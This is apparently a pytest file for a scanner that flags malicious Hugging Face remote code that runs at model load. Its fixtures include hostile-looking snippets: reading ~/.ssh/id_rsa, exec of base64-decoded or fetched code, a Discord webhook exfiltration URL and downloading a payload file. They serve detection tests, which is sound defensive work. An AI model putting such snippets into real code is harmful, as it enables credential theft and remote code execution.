"""Hugging Face remote code: what from_pretrained(..., trust_remote_code=True) runs."""

import hashlib
import json
import re
import urllib.parse

import pytest

from buckthorn import hf
from buckthorn.cli import main
from buckthorn.lock import FetchError

SHA = "a" * 40
OTHER_SHA = "b" * 40

CONFIG = json.dumps(
    {
        "model_type": "x",
        "auto_map": {
            "AutoConfig": "configuration_x.XConfig",
            "AutoModelForCausalLM": "modeling_x.XModel",
        },
    }
)
CONFIGURATION = """\
from transformers import PretrainedConfig

class XConfig(PretrainedConfig):
    model_type = "x"

    def __init__(self, hidden=4, **kwargs):
        self.hidden = hidden
        super().__init__(**kwargs)
"""


def modeling(init: str = "", forward: str = "", top: str = "", layer: str = "") -> str:
    """A small remote-code model, with code put in its __init__, forward or top level."""
    return f"""\
import os
import subprocess
import requests
import torch
from transformers import PreTrainedModel
from .configuration_x import XConfig
{top}

class XLayer(torch.nn.Module):
    def __init__(self, config):
        super().__init__()
        {layer or "pass"}

    def forward(self, x):
        return x


class XModel(PreTrainedModel):
    config_class = XConfig

    def __init__(self, config):
        super().__init__(config)
        self.layers = torch.nn.ModuleList([XLayer(config) for _ in range(2)])
        {init or "pass"}
        self.post_init()

    def forward(self, x):
        {forward or "pass"}
        return x
"""


def repo(tmp_path, files):
    folder = tmp_path / "model"
    folder.mkdir()
    for name, text in files.items():
        (folder / name).parent.mkdir(parents=True, exist_ok=True)
        (folder / name).write_text(text)
    return folder


def model(tmp_path, **parts):
    return repo(
        tmp_path,
        {
            "config.json": CONFIG,
            "configuration_x.py": CONFIGURATION,
            "modeling_x.py": modeling(**parts),
        },
    )


def rules(result):
    return {(f.rule_id, f.file_path) for f in result.findings}


def find(result, rule):
    (finding,) = [f for f in result.findings if f.rule_id == rule]
    return finding


def test_benign_remote_code_is_clean(tmp_path):
    result = hf.scan_folder(model(tmp_path))
    assert result.findings == []
    assert result.verdict == "clean"


def test_a_model_folder_with_no_remote_code_is_clean(tmp_path):
    folder = repo(tmp_path, {"config.json": '{"model_type": "llama"}', "demo.py": "import os\n"})
    assert hf.scan_folder(folder).verdict == "clean"


def test_top_level_of_an_auto_map_module_runs_at_load(tmp_path):
    result = hf.scan_folder(model(tmp_path, top="requests.get('https://example.invalid/x')"))
    finding = find(result, "BKT-HF-001")
    assert finding.file_path == "modeling_x.py"
    assert finding.metadata["lines"] == [7]
    assert finding.severity.value == "high"
    assert "at model load" in finding.message


def test_init_of_an_auto_map_class_runs_at_load(tmp_path):
    result = hf.scan_folder(model(tmp_path, init="subprocess.run(['id'])"))
    finding = find(result, "BKT-HF-002")
    assert "XModel.__init__" in finding.message


def test_forward_runs_only_when_called_so_is_not_read(tmp_path):
    result = hf.scan_folder(model(tmp_path, forward="requests.get('https://example.invalid')"))
    assert result.verdict == "clean"


def test_a_class_the_model_builds_runs_its_init(tmp_path):
    result = hf.scan_folder(model(tmp_path, layer="os.system('id')"))
    assert "XLayer.__init__" in find(result, "BKT-HF-002").message


def test_calls_are_followed_through_methods_and_relative_imports(tmp_path):
    folder = model(tmp_path, init="self._setup()", top="from .utils import helper")
    source = (folder / "modeling_x.py").read_text()
    source += "\n    def _setup(self):\n        helper()\n"
    (folder / "modeling_x.py").write_text(source)
    (folder / "utils.py").write_text(
        "import os\n\ndef helper():\n    return open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
    )
    result = hf.scan_folder(folder)
    assert ("BKT-HF-004", "utils.py") in rules(result)


def test_methods_transformers_calls_while_loading_count(tmp_path):
    folder = model(tmp_path)
    source = (folder / "modeling_x.py").read_text()
    source += "\n    def _init_weights(self, module):\n        requests.post('https://x.invalid')\n"
    (folder / "modeling_x.py").write_text(source)
    assert "XModel._init_weights" in find(hf.scan_folder(folder), "BKT-HF-001").message


def test_exfiltration_channels_count_anywhere(tmp_path):
    hook = "https://discord.com/api/webhooks/123456789012345678/" + "A" * 68
    result = hf.scan_folder(model(tmp_path, forward=f"url = {hook!r}"))
    assert ("BKT-EXFIL-001", "modeling_x.py") in rules(result)
    assert hook not in json.dumps([f.to_dict() for f in result.findings])


def test_hidden_code_counts_anywhere(tmp_path):
    result = hf.scan_folder(
        model(tmp_path, forward="import base64; exec(base64.b64decode('cHJpbnQoMSk='))")
    )
    assert ("BKT-HIDE-001", "modeling_x.py") in rules(result)


def test_downloading_more_code_at_load(tmp_path):
    init = "from huggingface_hub import hf_hub_download; hf_hub_download('evil/x', 'payload.py')"
    result = hf.scan_folder(model(tmp_path, init=init))
    assert ("BKT-HF-009", "modeling_x.py") in rules(result)


def test_downloading_weights_at_load_is_not_more_code(tmp_path):
    init = "from huggingface_hub import hf_hub_download; hf_hub_download('o/x', 'vision.bin')"
    assert hf.scan_folder(model(tmp_path, init=init)).verdict == "clean"


def test_loading_another_repo_with_remote_code_at_load(tmp_path):
    init = "import transformers as t; t.AutoModel.from_pretrained('o/x', trust_remote_code=True)"
    assert ("BKT-HF-009", "modeling_x.py") in rules(hf.scan_folder(model(tmp_path, init=init)))


def test_fetch_and_exec_at_load(tmp_path):
    result = hf.scan_folder(model(tmp_path, top="exec(requests.get('https://x.invalid').text)"))
    assert {"BKT-HF-001", "BKT-HF-003", "BKT-HF-009"} <= {f.rule_id for f in result.findings}


def test_a_missing_module_is_not_verified(tmp_path):
    folder = model(tmp_path)
    (folder / "configuration_x.py").unlink()
    result = hf.scan_folder(folder)
    assert ("BKT-SKIP-006", "configuration_x.py") in rules(result)
    assert result.verdict == "not_verified"


def test_a_module_that_will_not_parse_is_not_verified(tmp_path):
    folder = model(tmp_path)
    (folder / "modeling_x.py").write_text("def broken(:\n")
    assert ("BKT-SKIP-003", "modeling_x.py") in rules(hf.scan_folder(folder))


def test_auto_map_entries_transformers_cannot_load_are_not_code(tmp_path):
    config = {"auto_map": {"AutoModel": "a.b.C", "AutoTokenizer": "Xenova/gpt-4o"}}
    assert hf.scan_folder(repo(tmp_path, {"config.json": json.dumps(config)})).findings == []


def test_an_auto_map_file_outside_the_repo_is_not_verified(tmp_path):
    folder = repo(tmp_path, {"config.json": '{"auto_map": {"AutoModel": "/etc/x.C"}}'})
    assert hf.scan_folder(folder).verdict == "not_verified"


def test_an_auto_map_class_the_module_never_defines_loads_nothing(tmp_path):
    folder = model(tmp_path)
    config = json.loads(CONFIG)
    config["auto_map"]["AutoModel"] = "modeling_x.Missing"
    (folder / "config.json").write_text(json.dumps(config))
    assert hf.scan_folder(folder).verdict == "clean"


def test_an_auto_map_class_bound_some_other_way_is_not_verified(tmp_path):
    folder = model(tmp_path, top="from other_package import Made")
    config = json.loads(CONFIG)
    config["auto_map"]["AutoModel"] = "modeling_x.Made"
    (folder / "config.json").write_text(json.dumps(config))
    assert ("BKT-SKIP-006", "modeling_x.py") in rules(hf.scan_folder(folder))


def test_a_relative_import_outside_the_repo_is_not_read(tmp_path):
    folder = model(tmp_path, top='NOTE = """\nfrom ./../../secret import x\n"""')
    (tmp_path / "secret.py").write_text("import os\nos.system('id')\n")
    result = hf.scan_folder(folder)
    assert result.verdict == "not_verified"
    assert all("secret" not in f.file_path or f.rule_id == "BKT-SKIP-006" for f in result.findings)


def test_tokenizer_custom_pipeline_and_sentence_transformers_modules(tmp_path):
    bad = "import os\nos.system('id')\n"
    folder = repo(
        tmp_path,
        {
            "config.json": json.dumps({"custom_pipelines": {"x": {"impl": "pipe.P"}}}),
            "tokenizer_config.json": json.dumps({"auto_map": {"AutoTokenizer": ["tok.T", None]}}),
            "modules.json": json.dumps(
                [
                    {"type": "sentence_transformers.models.Pooling"},
                    {"type": "custom_st.Transformer"},
                ]
            ),
            "pipe.py": bad,
            "tok.py": bad,
            "custom_st.py": bad,
            "unused.py": bad,
        },
    )
    files = {f.file_path for f in hf.scan_folder(folder).findings if f.rule_id == "BKT-HF-002"}
    assert files == {"pipe.py", "tok.py", "custom_st.py"}


def test_code_from_another_repo_is_not_read_offline(tmp_path):
    config = {"auto_map": {"AutoModel": "other/code--modeling_y.Y"}}
    result = hf.scan_folder(repo(tmp_path, {"config.json": json.dumps(config)}))
    assert {"BKT-HF-010", "BKT-SKIP-006"} <= {f.rule_id for f in result.findings}


def test_hf_cache_snapshot_links_into_blobs_are_read(tmp_path):
    cache = tmp_path / "models--o--x"
    blobs, snapshot = cache / "blobs", cache / "snapshots" / SHA
    blobs.mkdir(parents=True)
    snapshot.mkdir(parents=True)
    texts = {
        "config.json": CONFIG,
        "configuration_x.py": CONFIGURATION,
        "modeling_x.py": modeling(init="os.system('id')"),
    }
    for n, (name, text) in enumerate(texts.items()):
        (blobs / str(n)).write_text(text)
        (snapshot / name).symlink_to(f"../../blobs/{n}")
    assert ("BKT-HF-002", "modeling_x.py") in rules(hf.scan_folder(snapshot))


def test_a_link_out_of_the_repo_is_not_followed(tmp_path):
    folder = model(tmp_path)
    (tmp_path / "elsewhere.py").write_text("x = 1\n")
    (folder / "configuration_x.py").unlink()
    (folder / "configuration_x.py").symlink_to(tmp_path / "elsewhere.py")
    assert ("BKT-SKIP-004", "configuration_x.py") in rules(hf.scan_folder(folder))


# --- From the Hub -----------------------------------------------------------------


def blob_id(data: bytes) -> str:
    return hashlib.sha1(b"blob %d\0" % len(data) + data, usedforsecurity=False).hexdigest()


def hub(repos):
    """A fake fetch for {repo: (sha, {file: text})}. Records every URL asked for."""

    def fetch(url, max_bytes):
        fetch.urls.append(url)
        api = re.fullmatch(
            r"https://huggingface\.co/api/models/(.+)/revision/(.+)\?blobs=true", url
        )
        if api and api[1] in repos:
            sha, files = repos[api[1]]
            if urllib.parse.unquote(api[2]) in (sha, "main"):
                siblings = [
                    {
                        "rfilename": name,
                        "size": len(data.encode()),
                        "blobId": blob_id(data.encode()),
                    }
                    for name, data in files.items()
                ]
                return json.dumps({"sha": sha, "siblings": siblings}).encode()
        got = re.fullmatch(r"https://huggingface\.co/(.+)/resolve/([0-9a-f]{40})/(.+)", url)
        if got and got[1] in repos and repos[got[1]][0] == got[2]:
            files = repos[got[1]][1]
            name = urllib.parse.unquote(got[3])
            if name in files:
                return files[name].encode()
        raise FetchError("404")

    fetch.urls = []
    return fetch


MODEL_FILES = {
    "config.json": CONFIG,
    "configuration_x.py": CONFIGURATION,
    "modeling_x.py": modeling(init="os.system('id')"),
    "model.safetensors": "weights",
    "pytorch_model.bin": "weights",
    "tokenizer.json": "{}",
    "demo.py": "import os\nos.system('id')\n",
}


def test_an_unpinned_repo_is_resolved_to_a_commit_and_reported():
    fetch = hub({"o/x": (SHA, MODEL_FILES)})
    result = hf.scan_repo("o/x", fetch=fetch)
    assert result.path == f"o/x@{SHA}"
    pin = find(result, "BKT-HF-010")
    assert SHA in pin.message and pin.severity.value == "info"
    assert ("BKT-HF-002", "modeling_x.py") in rules(result)
    # Only the API, the configs and the code it names, all at the commit.
    fetched = [u.rsplit("/", 1)[-1] for u in fetch.urls[1:]]
    assert sorted(fetched) == ["config.json", "configuration_x.py", "modeling_x.py"]
    assert all(f"/resolve/{SHA}/" in u for u in fetch.urls[1:])


def test_a_pinned_repo_has_no_pin_finding():
    result = hf.scan_repo(f"o/x@{SHA}", fetch=hub({"o/x": (SHA, MODEL_FILES)}))
    assert "BKT-HF-010" not in {f.rule_id for f in result.findings}


def test_a_branch_name_is_not_a_pin():
    fetch = hub({"o/x": (SHA, MODEL_FILES)})
    assert "BKT-HF-010" in {f.rule_id for f in hf.scan_repo("o/x@main", fetch=fetch).findings}


def test_code_from_another_repo_is_fetched_at_its_main_and_reported():
    files = {"config.json": json.dumps({"auto_map": {"AutoModel": "other/code--modeling_y.Y"}})}
    other = {"modeling_y.py": "import os\nos.system('id')\nclass Y:\n    pass\n"}
    result = hf.scan_repo(
        f"o/x@{SHA}", fetch=hub({"o/x": (SHA, files), "other/code": (OTHER_SHA, other)})
    )
    assert ("BKT-HF-002", f"other/code@{OTHER_SHA}/modeling_y.py") in rules(result)
    assert "other/code" in find(result, "BKT-HF-010").message
    assert find(result, "BKT-HF-010").severity.value == "low"


def test_a_file_that_does_not_match_its_blob_id_is_not_read():
    fetch = hub({"o/x": (SHA, MODEL_FILES)})

    def tampered(url, max_bytes):
        data = fetch(url, max_bytes)
        return data + b"\nimport os\n" if url.endswith("modeling_x.py") else data

    result = hf.scan_repo(f"o/x@{SHA}", fetch=tampered)
    assert ("BKT-SKIP-006", "modeling_x.py") in rules(result)
    assert ("BKT-HF-002", "modeling_x.py") not in rules(result)


def test_a_file_over_the_size_limit_is_not_fetched(monkeypatch):
    monkeypatch.setattr(hf, "MAX_FILE_BYTES", len(MODEL_FILES["modeling_x.py"]) - 1)
    fetch = hub({"o/x": (SHA, MODEL_FILES)})
    result = hf.scan_repo(f"o/x@{SHA}", fetch=fetch)
    assert ("BKT-SKIP-006", "modeling_x.py") in rules(result)
    assert not any(u.endswith("modeling_x.py") for u in fetch.urls)


def test_a_repo_that_cannot_be_read_is_not_verified():
    result = hf.scan_repo("o/gated", fetch=hub({}))
    assert result.verdict == "not_verified"
    assert find(result, "BKT-SKIP-006").file_path == "o/gated"


@pytest.mark.parametrize(
    "spec", ["", "o/x/y", "../x", "o/x@", "o/x@a b", "https://huggingface.co/o/x"]
)
def test_bad_repo_ids_are_refused(spec):
    with pytest.raises(ValueError):
        hf.parse_spec(spec)


@pytest.mark.parametrize(
    "url, ok",
    [
        ("https://huggingface.co/o/x/resolve/a/config.json", True),
        ("https://cdn-lfs.huggingface.co/x", True),
        ("https://cas-bridge.xethub.hf.co/x", True),
        ("http://huggingface.co/o/x", False),
        ("https://evilhuggingface.co/x", False),
        ("https://huggingface.co.evil.com/x", False),
        ("https://user@huggingface.co/x", False),
        ("https://huggingface.co:8443/x", False),
    ],
)
def test_only_huggingface_hosts_over_https(url, ok):
    assert hf.allowed_url(url) is ok


# --- Command line -----------------------------------------------------------------


def test_scan_reads_a_model_folder(tmp_path, capsys):
    folder = model(tmp_path, init="os.system('id')")
    assert main(["scan", str(folder)]) == 1
    assert "BKT-HF-002" in capsys.readouterr().out


def test_hf_command_reads_the_hub(monkeypatch, capsys):
    monkeypatch.setattr(hf, "fetch_url", hub({"o/x": (SHA, MODEL_FILES)}))
    assert main(["hf", f"o/x@{SHA}", "--format", "json"]) == 1
    report = json.loads(capsys.readouterr().out)
    assert report["artifacts"][0]["path"] == f"o/x@{SHA}"


def test_hf_command_refuses_a_bad_repo_id(capsys):
    assert main(["hf", "not a repo"]) == 2
    assert "not a repo" in capsys.readouterr().err


def test_hf_findings_can_be_allowed_by_repo(monkeypatch, tmp_path, capsys):
    monkeypatch.setattr(hf, "fetch_url", hub({"o/x": (SHA, MODEL_FILES)}))
    allow = tmp_path / "allow.json"
    entry = {"rule": "BKT-HF-002", "package": "o/x", "file": "modeling_x.py", "reason": "ok"}
    allow.write_text(json.dumps({"allow": [entry]}))
    assert main(["hf", f"o/x@{SHA}", "--allowlist", str(allow)]) == 0


# --- Review fixes -------------------------------------------------------------


def test_a_bare_decorator_from_another_file_runs_at_import(tmp_path):
    folder = model(tmp_path, top="from .utils import register\n\n@register\nclass Extra:\n    pass")
    (folder / "utils.py").write_text(
        "import requests\n\ndef register(cls):\n"
        "    requests.get('https://x.invalid')\n    return cls\n"
    )
    assert ("BKT-HF-001", "utils.py") in rules(hf.scan_folder(folder))


def test_a_metaclass_and_init_subclass_run_when_a_class_is_defined(tmp_path):
    top = (
        "from .utils import Meta, Base\n\n"
        "class A(metaclass=Meta):\n    pass\n\nclass B(Base):\n    pass"
    )
    folder = model(tmp_path, top=top)
    (folder / "utils.py").write_text(
        "import os\nimport subprocess\n\n"
        "class Meta(type):\n    def __new__(mcs, *a):\n        os.system('id')\n"
        "        return super().__new__(mcs, *a)\n\n"
        "class Base:\n    def __init_subclass__(cls):\n        subprocess.run(['id'])\n"
    )
    finding = find(hf.scan_folder(folder), "BKT-HF-002")
    assert finding.file_path == "utils.py"
    assert finding.metadata["lines"] == [6, 11]


def test_each_built_class_finds_its_own_override_through_a_shared_base(tmp_path):
    base = (
        "import os\n\nclass Base:\n    def __init__(self, config):\n        self.setup()\n\n"
        "    def setup(self):\n        pass\n\n"
        "class A(Base):\n    pass\n\n"
        "class B(Base):\n    def setup(self):\n        os.system('id')\n"
    )
    config = {"auto_map": {"AutoModel": "m.A", "AutoModelForCausalLM": "m.B"}}
    folder = repo(tmp_path, {"config.json": json.dumps(config), "m.py": base})
    assert "B.setup" in find(hf.scan_folder(folder), "BKT-HF-002").message


def test_an_annotated_config_class_is_built(tmp_path):
    folder = model(tmp_path)
    config = json.loads(CONFIG)
    del config["auto_map"]["AutoConfig"]
    (folder / "config.json").write_text(json.dumps(config))
    source = (folder / "modeling_x.py").read_text()
    source = source.replace("    config_class = XConfig", "    config_class: type = XConfig")
    (folder / "modeling_x.py").write_text(source)
    (folder / "configuration_x.py").write_text(
        CONFIGURATION + "\n    def to_dict(self):\n        import os\n        os.system('id')\n"
    )
    assert ("BKT-HF-002", "configuration_x.py") in rules(hf.scan_folder(folder))


def test_configs_count_toward_the_file_limit(tmp_path, monkeypatch):
    monkeypatch.setattr(hf, "MAX_FILES", 2)
    folder = model(tmp_path)
    (folder / "a_config.json").write_text("{}")
    assert ("BKT-SKIP-006", "modeling_x.py") in rules(hf.scan_folder(folder))


def test_only_a_hub_cache_snapshot_lets_links_reach_its_grandparent(tmp_path):
    folder = tmp_path / "work" / "snapshots" / "repo"
    folder.mkdir(parents=True)
    (folder / "config.json").write_text(CONFIG)
    (tmp_path / "work" / "configuration_x.py").write_text(CONFIGURATION)
    (folder / "configuration_x.py").symlink_to(tmp_path / "work" / "configuration_x.py")
    assert ("BKT-SKIP-004", "configuration_x.py") in rules(hf.scan_folder(folder))


def test_an_allowlist_never_covers_code_from_another_repo(monkeypatch, tmp_path):
    files = {"config.json": json.dumps({"auto_map": {"AutoModel": "other/code--modeling_y.Y"}})}
    other = {"modeling_y.py": "import os\nos.system('id')\nclass Y:\n    pass\n"}
    fetch = hub({"o/x": (SHA, files), "other/code": (OTHER_SHA, other)})
    monkeypatch.setattr(hf, "fetch_url", fetch)
    allow = tmp_path / "allow.json"
    entries = [{"rule": r, "package": "o/x", "reason": "ok"} for r in ("BKT-HF-002", "BKT-HF-010")]
    allow.write_text(json.dumps({"allow": entries}))
    assert main(["hf", f"o/x@{SHA}", "--allowlist", str(allow)]) == 1


def test_custom_generate_is_read_without_auto_map(tmp_path):
    folder = repo(
        tmp_path,
        {
            "config.json": '{"architectures": ["LlamaForCausalLM"]}',
            "custom_generate/generate.py": "from .helpers import go\n",
            "custom_generate/helpers.py": "import os\nos.system('id')\ndef go():\n    pass\n",
        },
    )
    result = hf.scan_folder(folder)
    assert ("BKT-HF-002", "custom_generate/helpers.py") in rules(result)


def test_the_repos_own_code_named_with_its_repo_id_is_read_at_the_pinned_commit():
    files = {
        "config.json": json.dumps({"auto_map": {"AutoModel": "o/x--modeling_y.Y"}}),
        "modeling_y.py": "import os\nos.system('id')\nclass Y:\n    pass\n",
    }
    fetch = hub({"o/x": (SHA, files)})
    result = hf.scan_repo(f"o/x@{SHA}", fetch=fetch)
    assert ("BKT-HF-002", "modeling_y.py") in rules(result)
    assert "BKT-HF-010" not in {f.rule_id for f in result.findings}


def test_a_sentence_transformers_type_from_another_repo_is_not_skipped(tmp_path):
    modules = json.dumps([{"type": "evil/repo--mod.Cls"}])
    folder = repo(tmp_path, {"config.json": "{}", "modules.json": modules})
    assert {("BKT-SKIP-006", "evil/repo"), ("BKT-HF-010", "evil/repo")} <= rules(
        hf.scan_folder(folder)
    )


def test_calls_nested_past_the_limit_fail_closed(tmp_path, monkeypatch):
    def too_deep(*args, **kwargs):
        raise RecursionError

    monkeypatch.setattr(hf._Follower, "reach_class", too_deep)
    assert ("BKT-SKIP-003", "modeling_x.py") in rules(hf.scan_folder(model(tmp_path)))


def test_no_receipt_for_a_model_folder(tmp_path):
    folder = model(tmp_path)
    assert main(["scan", str(folder), "--receipt", str(tmp_path / "r.json")]) == 2
